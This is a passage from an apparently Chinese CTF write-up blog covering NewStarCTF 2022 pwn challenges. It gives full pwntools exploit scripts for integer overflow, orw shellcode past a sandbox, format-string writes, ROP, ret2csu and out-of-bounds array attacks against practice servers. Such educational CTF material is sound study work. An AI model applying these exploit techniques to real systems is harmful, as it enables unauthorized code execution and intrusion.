class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-number">0x4033f8</span>)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>))<br>se(p64(system))<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK2">WEEK2</h2><h3 id="uint32-and-ret">uint32 and ret:</h3><p>就是个负数转无符号会变为一个很大的数，就能溢出，然后太大也不行read不了，找一下64位无符号int是多少，然后对应减掉一点，用gdb调试一下就知道了，还有就是用ret调一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./uint&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25835</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br>ret=<span class="hljs-number">0x40101a</span><br>backdoor=<span class="hljs-number">0x4011b6</span><br>sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">4294967094</span>))<br><span class="hljs-comment">#debug()</span><br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x58</span>+p64(ret)+p64(backdoor))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="shellcode-revenge：">shellcode-revenge：</h3><p>沙盒禁用了execve</p><p>保护就canary没开</p><p>思路：就是第一个read往mmap地址写 （调用read往mmap+21地址写0x800字节函数）的汇编（注：21是因为汇编长度为21），写入orw后会紧接着执行orw语句，<br>栈溢出跳到mmap</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25278</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br>mmap=<span class="hljs-number">0x233000</span><br>se(asm(shellcraft.read(<span class="hljs-number">0</span>,mmap+<span class="hljs-number">21</span>,<span class="hljs-number">0x800</span>)))<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">len</span>(asm(shellcraft.read(<span class="hljs-number">0</span>,mmap+<span class="hljs-number">21</span>,<span class="hljs-number">0x800</span>)))<br>orw_payload=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>)<br>orw_payload+=shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)   <br>orw_payload+=shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x850</span>,<span class="hljs-number">0x50</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(orw_payload))<br>sl(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(mmap))<br>sl(asm(orw_payload))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="砍一刀：">砍一刀：</h3><p>这题有格式化字符串漏洞</p><p>偏移为8</p><p>所以只要改diamond为10即可<br>diamond=0x404090<br>注意64位p64（diamond）要放在后面，不然要被截断<br>想了很久怎么去交互，这个脚本只能说极小概率成功，多试几次</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn2&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28562</span>)<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;666&#x27;</span>)<br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">18</span>):<br>    sl(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>sl(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    sl(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-string">&#x27;10&#x27;</span>+<span class="hljs-string">&#x27;c%10$n&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">7</span>+p64(<span class="hljs-number">0x404090</span>))<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="buffer-fly">buffer-fly:</h3><p>保护就canary没开</p><p><img src="/2022/11/16/newstarctf2022/1.png" alt="1"></p><p>printf遇到’\x00’截断，我们可以泄露在 rbp-0x20到rbp之间的地址</p><p>第一个read我们泄露函数的地址，得到gadget <code>pop_rdi</code>，<code>system</code></p><p>第二个read泄露栈的地址，填入<code>sh flag\x00</code></p><p>因为程序close(0),close(1)关闭了标准输入，标准输出</p><p>所以第三个read栈溢出sh执行flag，导致标准错误输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./buffer_fly&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28290</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>sea(<span class="hljs-string">&#x27;give me your name: &#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>)<br>ru(<span class="hljs-string">&#x27;your name: aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)<br>function_addr=uu64(rc(<span class="hljs-number">6</span>))<br>boy_next_door=function_addr+<span class="hljs-number">3</span><br>base=boy_next_door-<span class="hljs-number">0x128e</span><br>info(<span class="hljs-string">&quot;function_base&quot;</span>,base)<br>pop_rdi=base+<span class="hljs-number">0x1423</span><br>ret=base+<span class="hljs-number">0x101a</span><br>system=base+<span class="hljs-number">0x129d</span><br><span class="hljs-comment">#debug()</span><br>sea(<span class="hljs-string">&#x27;your age: &#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>)<br>stack_addr=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])<br><span class="hljs-comment">#debug()</span><br>info(<span class="hljs-string">&#x27;stack_addr&#x27;</span>,stack_addr)<br>payload=flat(<span class="hljs-string">&#x27;sh flag\x00&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>,pop_rdi,stack_addr-<span class="hljs-number">0x30</span>,system)<br>sea(<span class="hljs-string">&#x27;susu give me your wechat number: &#x27;</span>,payload)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK3">WEEK3</h2><h3 id="cat-flag">cat flag</h3><p>提示趁它sleep时edit把name改为flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28863</span> )<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sla(<span class="hljs-string">&#x27;==&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Input the file name you want to cat.\n&#x27;</span>,<span class="hljs-string">&#x27;backdoor&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;==&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Input new name you want to change.\n&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="Read-Write">Read&amp;Write</h3><p>存在数组越界，和向后读写，可以向后越界泄露libc_base，程序实际地址什么的，然后rop一下就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br><br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    ru(<span class="hljs-string">&#x27;The num: &#x27;</span>)<br>    low_addr=<span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">10</span>)<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx+<span class="hljs-number">1</span>))<br>    ru(<span class="hljs-string">&#x27;The num: &#x27;</span>)<br>    high_addr=<span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>),<span class="hljs-number">10</span>)<br>    <span class="hljs-keyword">return</span> high_addr*(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)+low_addr<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">w</span>(<span class="hljs-params">idx,num</span>):<br>    high_num=<span class="hljs-built_in">int</span>(num/(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>))<br>    low_num=num%(<span class="hljs-number">2</span>**<span class="hljs-number">32</span>)<br>    <span class="hljs-comment">#print(high_num)</span><br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sla(<span class="hljs-string">&#x27;Num:&#x27;</span>,<span class="hljs-built_in">str</span>(low_num))<br>    sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Idx:&#x27;</span>,<span class="hljs-built_in">str</span>(idx+<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">&#x27;Num:&#x27;</span>,<span class="hljs-built_in">str</span>(high_num))<br><span class="hljs-comment">#--------------------------</span><br>base=s(<span class="hljs-number">0x110</span>)-elf.sym[<span class="hljs-string">&#x27;__libc_csu_init&#x27;</span>]<br>info(<span class="hljs-string">&quot;base&quot;</span>,base)<br>libc_base=s(<span class="hljs-number">0x12c</span>)-<span class="hljs-number">0x236190</span><br>info(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>pop_rdi = libc_base + <span class="hljs-number">0x23b6a</span><br>ret=libc_base + <span class="hljs-number">0x22679</span><br>binsh=libc_base+<span class="hljs-number">0x1B45BD</span><br>system =libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>w(<span class="hljs-number">0x106</span>,ret)<br>w(<span class="hljs-number">0x108</span>,pop_rdi)<br>w(<span class="hljs-number">0x10a</span>,binsh)<br><span class="hljs-comment">#debug()</span><br>w(<span class="hljs-number">0x10c</span>,system)<br>sla(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="ret2csu1">ret2csu1</h3><p>总而言之就是用ret2csu来rop出execve(“/bin/cat”,{“/bin/cat”,“/flag”,NULL},0)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import * <br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select =<span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br>elif select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27162</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = lambda data               :r.send(data) <br>sa      = lambda delim,data         :r.sendafter(delim, data)<br>sl      = lambda data               :r.sendline(data)<br>sla     = lambda delim,data         :r.sendlineafter(delim, data)<br>sea     = lambda delim,data         :r.sendafter(delim, data)<br>def debug(cmd=<span class="hljs-string">&#x27;&#x27;):</span><br><span class="hljs-string">     gdb.attach(r,cmd)</span><br><span class="hljs-string">     pause()</span><br><span class="hljs-string">#------------------------</span><br><span class="hljs-string">def csu(rdi,rsi,rdx,function):</span><br><span class="hljs-string">    csu_front_addr=0x400710</span><br><span class="hljs-string">    csu_end_addr=0x40072A</span><br><span class="hljs-string">    payload = b&#x27;</span>&#x27;<br>    payload += p64(csu_end_addr) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(function) + p64(<br>        rdi) + p64(rsi) + p64(rdx)<br>    payload += p64(csu_front_addr)<br>    payload += b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span> * <span class="hljs-number">0x38</span><br>    <span class="hljs-keyword">return</span> payload<br>#----------------<br>bincat=<span class="hljs-number">0x4007BB</span><br>flag=<span class="hljs-number">0x601050</span><br>execve=<span class="hljs-number">0x601068</span><br>payload=b<span class="hljs-number">&#x27;</span>a<span class="hljs-number">&#x27;</span>*<span class="hljs-number">0x28</span>+csu(bincat,flag,<span class="hljs-number">0</span>,execve)<br><span class="hljs-meta">#debug()</span><br>sea(<span class="hljs-string">&#x27;I hide some useful text in this elf.Remember to check it!\n&#x27;</span>,payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="sheep-a-flag">sheep a flag</h3><p>完全可以手动走一下迷宫，ctrl+c转换到脚本用格式化字符串往0x602080地址写0x1D4B42</p><p><a href="https://home.cnblogs.com/u/xyqer/">fmt</a>从这位师傅抄了一个，懒得写了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br>local_file  = <span class="hljs-string">&#x27;./sheep_a_flag&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br><span class="hljs-comment">#------------------------</span><br>r.interactive()<br>payload=<span class="hljs-string">b&#x27;%29c%10$hhn%37c%11$hhn%9c%12$hhn&#x27;</span>+p64(<span class="hljs-number">0x602082</span>)+p64(<span class="hljs-number">0x602080</span>)+p64(<span class="hljs-number">0x602081</span>)<br>se(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h2 id="WEEK4">WEEK4</h2><h3 